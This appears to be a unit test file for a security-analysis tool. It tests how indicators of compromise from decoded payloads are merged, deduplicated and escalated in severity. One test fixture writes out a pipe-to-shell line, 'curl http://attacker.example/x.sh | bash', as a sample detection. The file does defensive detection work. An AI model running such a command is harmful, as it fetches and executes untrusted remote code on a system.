'use strict';
// merge-encoded-ioc.test.js — unit tests for
// `App.prototype._mergeEncodedFindingIocs(ef, analysisText)`.
//
// The helper is the single chokepoint that merges per-encoded-finding
// `iocs[]` arrays into the host-side `findings.externalRefs` /
// `findings.interestingStrings` buckets. It replaced two near-duplicate
// merge loops that had diverged on:
//
//   1. Bucket routing (detection types → externalRefs, everything else
//      → interestingStrings).
//   2. Cross-bucket deduplication (the plaintext-extractor run earlier
//      in the pipeline often surfaces the SAME URL that a decoder then
//      re-extracts from a decoded payload; without cross-bucket dedupe
//      the sidebar shows two rows for the same URL at two different
//      severities).
//   3. Monotonic severity escalation on existing rows (a decoded-
//      payload's view of a URL is strictly more informative than the
//      passive plaintext extraction — `info` must escalate to `high`
//      when the decoder sees the same URL).
//   4. Technique-scoped notes (`Detected in <ef.technique>` or
//      `Detected via <ef.chain>`) so the analyst sees WHY the row
//      escalated.
//   5. Back-references for cross-flash (`_encodedFinding`,
//      `_decodedFrom`) — stamped only for normal findings, skipped for
//      detection-only sentinels which have no card to flash to.
//
// These tests pin each of those behaviours. The helper is tested in
// isolation by capturing the `extendApp({...})` method bag via the
// same pattern used by `copy-analysis-new-renderers.test.js`.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules } = require('../helpers/load-bundle.js');

/** Load `_mergeEncodedFindingIocs` into a testable method bag. */
function loadMergeHelper() {
  const methods = {};
  const ctx = loadModules(
    [
      'src/constants.js',
      'src/app/app-load.js',
    ],
    {
      shims: {
        extendApp: (obj) => Object.assign(methods, obj),
      },
      expose: ['IOC', 'pushIOC', 'IOC_CANONICAL_SEVERITY'],
    },
  );
  return { methods, ctx };
}

/** Construct a minimal `this` for the helper. */
function newFindings() {
  return {
    risk: 'low',
    interestingStrings: [],
    externalRefs: [],
    encodedContent: [],
  };
}

// ── Routing ────────────────────────────────────────────────────────────────

test('_mergeEncodedFindingIocs: routes detection types to externalRefs, other types to interestingStrings', () => {
  const { methods, ctx } = loadMergeHelper();
  const findings = newFindings();
  const app = { findings };
  const ef = {
    technique: 'Test Technique',
    offset: 0,
    length: 10,
    iocs: [
      { type: ctx.IOC.URL,     url: 'http://example.com/a', severity: 'high' },
      { type: ctx.IOC.PATTERN, url: 'Test pattern',          severity: 'critical' },
      { type: ctx.IOC.INFO,    url: 'Test info',             severity: 'info' },
      { type: ctx.IOC.IP,      url: '198.51.100.1',          severity: 'medium' },
    ],
  };
  methods._mergeEncodedFindingIocs.call(app, ef, 'dummy analysis text');
  const intUrls = findings.interestingStrings.map(r => `${r.type}|${r.url}`);
  const extUrls = findings.externalRefs.map(r => `${r.type}|${r.url}`);
  assert.ok(intUrls.includes(`${ctx.IOC.URL}|http://example.com/a`),
    `URL must route to interestingStrings; got intStr=${JSON.stringify(intUrls)}`);
  assert.ok(intUrls.includes(`${ctx.IOC.IP}|198.51.100.1`),
    'IP must route to interestingStrings');
  assert.ok(extUrls.includes(`${ctx.IOC.PATTERN}|Test pattern`),
    `PATTERN must route to externalRefs; got extRefs=${JSON.stringify(extUrls)}`);
  assert.ok(extUrls.includes(`${ctx.IOC.INFO}|Test info`),
    'INFO must route to externalRefs');
});

// ── Cross-bucket dedupe + severity escalation ───────────────────────────────

test('_mergeEncodedFindingIocs: collapses a decoded URL against an existing plaintext URL and escalates severity', () => {
  // The concrete regression: plaintext extractor emits
  //   { IOC.URL, 'http://attacker/', 'info' }
  // into interestingStrings. Then a bash live-fetch candidate's
  // detection-only sentinel carries the same URL at 'high'. Before
  // the helper, both rows appeared in the sidebar IOC table (one
  // info from interestingStrings, one high from externalRefs).
  const { methods, ctx } = loadMergeHelper();
  const findings = newFindings();
  findings.interestingStrings.push({
    type: ctx.IOC.URL,
    url: 'http://attacker.example/x.sh',
    severity: 'info',
  });
  const app = { findings };
  const ef = {
    _detectionOnly: true,
    technique: 'Bash Pipe-to-Shell (live fetch)',
    offset: 0,
    length: 45,
    iocs: [
      { type: ctx.IOC.URL, url: 'http://attacker.example/x.sh', severity: 'high' },
    ],
  };
  methods._mergeEncodedFindingIocs.call(app, ef, 'curl http://attacker.example/x.sh | bash');
  // Exactly one URL row across both buckets.
  const allUrls = [
    ...findings.interestingStrings,
    ...findings.externalRefs,
  ].filter(r => r.type === ctx.IOC.URL && r.url === 'http://attacker.example/x.sh');
  assert.equal(allUrls.length, 1,
    `expected exactly one row for the URL; got: ${JSON.stringify(allUrls)}`);
  assert.equal(allUrls[0].severity, 'high',
    `severity must escalate info → high; got: ${allUrls[0].severity}`);
  assert.match(allUrls[0].note || '', /Bash Pipe-to-Shell/,
    `technique-scoped note must be stamped; got note: ${allUrls[0].note}`);
});

test('_mergeEncodedFindingIocs: severity escalation is monotonic — never downgrades', () => {
  const { methods, ctx } = loadMergeHelper();
  const findings = newFindings();
  findings.interestingStrings.push({
    type: ctx.IOC.URL,
    url: 'http://critical.example/',
    severity: 'critical',
  });
  const app = { findings };
  const ef = {
    technique: 'Medium-severity decoder',
    offset: 0,
    length: 10,
    iocs: [
      { type: ctx.IOC.URL, url: 'http://critical.example/', severity: 'medium' },
    ],
  };
  methods._mergeEncodedFindingIocs.call(app, ef, '');
  const row = findings.interestingStrings.find(
    r => r.type === ctx.IOC.URL && r.url === 'http://critical.example/'
  );
  assert.equal(row.severity, 'critical',
    `monotonic escalation must preserve higher severity; got: ${row.severity}`);
});

// ── Note stamping ──────────────────────────────────────────────────────────

test('_mergeEncodedFindingIocs: preserves existing note on an already-noted row', () => {
  // If the plaintext extractor attached a note (e.g. via SafeLinks
  // unwrap), the decoder's technique-scoped note must NOT overwrite.
  const { methods, ctx } = loadMergeHelper();
  const findings = newFindings();
  findings.interestingStrings.push({
    type: ctx.IOC.URL,
    url: 'http://safelinks.example/',
    severity: 'medium',
    note: 'Proofpoint wrapper',
  });
  const app = { findings };
  const ef = {
    technique: 'Bash Pipe-to-Shell (live fetch)',
    offset: 0, length: 10,
    iocs: [{ type: ctx.IOC.URL, url: 'http://safelinks.example/', severity: 'high' }],
  };
  methods._mergeEncodedFindingIocs.call(app, ef, '');
  const row = findings.interestingStrings.find(
    r => r.url === 'http://safelinks.example/'
  );
  assert.equal(row.note, 'Proofpoint wrapper',
    `existing note must not be overwritten; got: ${row.note}`);
  assert.equal(row.severity, 'high');
});

// ── Back-refs ──────────────────────────────────────────────────────────────

test('_mergeEncodedFindingIocs: stamps _encodedFinding + _decodedFrom on normal findings', () => {
  const { methods, ctx } = loadMergeHelper();
  const findings = newFindings();
  const app = { findings };
  const ef = {
    type: 'encoded-content',
    chain: ['Base64', 'gzip', 'PowerShell'],
    technique: 'Base64',
    offset: 100, length: 200,
    iocs: [{ type: ctx.IOC.URL, url: 'http://decoded.example/', severity: 'high' }],
  };
  methods._mergeEncodedFindingIocs.call(app, ef, '');
  const row = findings.interestingStrings.find(
    r => r.url === 'http://decoded.example/'
  );
  assert.strictEqual(row._encodedFinding, ef,
    'normal findings stamp _encodedFinding back-ref for cross-flash');
  assert.equal(row._decodedFrom, 'Base64 → gzip → PowerShell',
    `_decodedFrom must be the chain; got: ${row._decodedFrom}`);
});

test('_mergeEncodedFindingIocs: does NOT stamp _encodedFinding on detection-only sentinels', () => {
  // Detection-only sentinels are filtered out of encodedContent
  // downstream; stamping a back-ref to them would point at a card
  // that never renders.
  const { methods, ctx } = loadMergeHelper();
  const findings = newFindings();
  const app = { findings };
  const ef = {
    _detectionOnly: true,
    technique: 'Bash Pipe-to-Shell (live fetch)',
    offset: 0, length: 10,
    iocs: [{ type: ctx.IOC.URL, url: 'http://attacker.example/', severity: 'high' }],
  };
  methods._mergeEncodedFindingIocs.call(app, ef, '');
  const row = findings.interestingStrings.find(
    r => r.url === 'http://attacker.example/'
  );
  assert.equal(row._encodedFinding, undefined,
    '_detectionOnly sentinels must NOT carry _encodedFinding back-ref');
});

// ── Empty / malformed input handling ───────────────────────────────────────

test('_mergeEncodedFindingIocs: no-op on missing/empty iocs', () => {
  const { methods } = loadMergeHelper();
  const findings = newFindings();
  const app = { findings };
  methods._mergeEncodedFindingIocs.call(app, null, '');
  methods._mergeEncodedFindingIocs.call(app, { iocs: [] }, '');
  methods._mergeEncodedFindingIocs.call(app, { iocs: null }, '');
  methods._mergeEncodedFindingIocs.call(app, {}, '');
  assert.equal(findings.interestingStrings.length, 0);
  assert.equal(findings.externalRefs.length, 0);
});

test('_mergeEncodedFindingIocs: skips malformed iocs missing type or url', () => {
  const { methods, ctx } = loadMergeHelper();
  const findings = newFindings();
  const app = { findings };
  const ef = {
    offset: 0, length: 1,
    iocs: [
      null,
      { type: ctx.IOC.URL },              // missing url
      { url: 'http://no-type.example/' }, // missing type
      { type: ctx.IOC.URL, url: 'http://valid.example/', severity: 'high' },
    ],
  };
  methods._mergeEncodedFindingIocs.call(app, ef, '');
  // Only the valid one lands (and its DOMAIN sibling via pushIOC's
  // emitUrlSiblings — but that's only active when tldts is loaded,
  // which it isn't in unit tests, so just the URL itself).
  const urlRows = findings.interestingStrings.filter(r => r.type === ctx.IOC.URL);
  assert.equal(urlRows.length, 1);
  assert.equal(urlRows[0].url, 'http://valid.example/');
});

// ── Source-offset stamping ─────────────────────────────────────────────────

test('_mergeEncodedFindingIocs: stamps _sourceOffset/_sourceLength on new inserts via pushIOC', () => {
  const { methods, ctx } = loadMergeHelper();
  const findings = newFindings();
  const app = { findings };
  const analysisText = 'x'.repeat(500);
  const ef = {
    technique: 'Test',
    offset: 100, length: 50,
    iocs: [{ type: ctx.IOC.URL, url: 'http://new.example/', severity: 'high' }],
  };
  methods._mergeEncodedFindingIocs.call(app, ef, analysisText);
  const row = findings.interestingStrings.find(r => r.url === 'http://new.example/');
  assert.equal(row._sourceOffset, 100);
  assert.equal(row._sourceLength, 50);
});

test('_mergeEncodedFindingIocs: does NOT overwrite existing _sourceOffset on merged row', () => {
  const { methods, ctx } = loadMergeHelper();
  const findings = newFindings();
  findings.interestingStrings.push({
    type: ctx.IOC.URL,
    url: 'http://existing.example/',
    severity: 'info',
    _sourceOffset: 5,
    _sourceLength: 10,
    _highlightText: 'existing marker',
  });
  const app = { findings };
  const ef = {
    technique: 'Test',
    offset: 500, length: 50,
    iocs: [{ type: ctx.IOC.URL, url: 'http://existing.example/', severity: 'high' }],
  };
  methods._mergeEncodedFindingIocs.call(app, ef, 'xxx');
  const row = findings.interestingStrings.find(
    r => r.url === 'http://existing.example/'
  );
  assert.equal(row._sourceOffset, 5, 'must not overwrite existing _sourceOffset');
  assert.equal(row._highlightText, 'existing marker');
});

// ── Unresolved-sentinel rejection ──────────────────────────────────────────
//
// Partially-resolved decoder output (AppleScript char-code chain with an
// unresolved ref, CMD `⟨VAR:~0,3⟩` substring placeholder, bash
// `⟨…⟩` elision) carries U+27E8 / U+27E9 sentinels that must never reach
// the IOC sidebar. A URL like `https://⟨unresolved:__iunw9unf⟩/` is not
// a real pivot — the unresolved span, by definition, isn't
// fetch-reachable. `_mergeEncodedFindingIocs` is the final chokepoint
// before host-side buckets and drops any sentinel-bearing row outright.

test('_mergeEncodedFindingIocs: rejects IOC rows containing ⟨unresolved:…⟩ sentinels', () => {
  const { methods, ctx } = loadMergeHelper();
  const findings = newFindings();
  const app = { findings };
  const ef = {
    type: 'encoded-content',
    technique: 'AppleScript Reassembled Shell Command',
    offset: 0, length: 100,
    iocs: [
      // Partially-resolved URL with AppleScript-style unresolved-ref sentinel.
      { type: ctx.IOC.URL,     url: 'https://\u27E8unresolved:__iunw9unf\u27E9/', severity: 'high' },
      // PATTERN label interpolating a resolved value that still carries a sentinel.
      { type: ctx.IOC.PATTERN, url: 'Dynamic C2 \u2014 https://\u27E8unresolved:_Runtime\u27E9/beacon', severity: 'high' },
      // CMD-style substring-op placeholder.
      { type: ctx.IOC.URL,     url: 'http://\u27E8VAR:~0,3\u27E9.example/', severity: 'medium' },
      // Bash-style ellipsis sentinel.
      { type: ctx.IOC.URL,     url: 'https://partial.example/\u27E8\u2026\u27E9', severity: 'medium' },
      // Clean URL — must still land.
      { type: ctx.IOC.URL,     url: 'https://clean.example/path', severity: 'high' },
    ],
  };
  methods._mergeEncodedFindingIocs.call(app, ef, 'x');
  const allRows = [...findings.interestingStrings, ...findings.externalRefs];
  for (const r of allRows) {
    assert.ok(!/\u27E8|\u27E9/.test(r.url),
      `no IOC row may carry \u27E8 / \u27E9 sentinel chars; leaked: ${JSON.stringify(r)}`);
  }
  // The clean URL must still have landed (and its DOMAIN sibling, if
  // tldts is loaded — which it isn't in unit-test context, so just the URL).
  const cleanHit = allRows.find(r => r.url === 'https://clean.example/path');
  assert.ok(cleanHit, `clean URL must pass the sentinel gate; got rows: ${JSON.stringify(allRows)}`);
});
